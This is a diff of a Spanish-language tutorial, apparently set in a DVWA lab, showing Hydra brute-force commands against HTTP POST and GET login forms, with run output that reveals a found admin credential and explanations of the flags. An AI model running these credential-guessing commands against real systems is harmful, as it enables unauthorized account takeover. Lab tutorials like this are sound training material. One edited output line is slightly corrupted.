@@ -6,15 +6,16 @@ ___
 ### POST-FORM
 #### Ejecución
 ``` java
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hydra 192.168.200.152 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -L user.txt -P password.txt   
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-15 11:03:17
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 78 login tries (l:3/p:26), ~5 tries per task
 [DATA] attacking http-post-form://192.168.200.152:80/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
 [80][http-post-form] host: 192.168.200.152   login: admin   password: password
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-15 11:03:20
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 En la línea de comando de Hydra, los flags significan lo siguiente:
 
@@ -26,8 +27,8 @@ En la línea de comando de Hydra, los flags significan lo siguiente:
 
 ### GET_FORM
 #### Ejecución
-
 ```java
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hydra 192.168.200.152 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low:F=Username and/or password incorrect" -L user.txt -P /usr/share/wordlists/rockyou.txt   
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-15 12:57:21
@@ -36,9 +37,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-15 12:57:
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
 [DATA] attacking http-get-form://192.168.200.152:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low:F=Username and/or password incorrect
 [80][http-get-form] host: 192.168.200.152   login: admin   password: password
-^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
-
 Este comando usa la herramienta Hydra para realizar un ataque de fuerza bruta en un formulario de inicio de sesión en una página web alojada en la dirección IP 192.168.200.152.
 
 >* **"http-get-form".-** especifica que se debe usar el método HTTP GET para enviar el formulario de inicio de sesión.
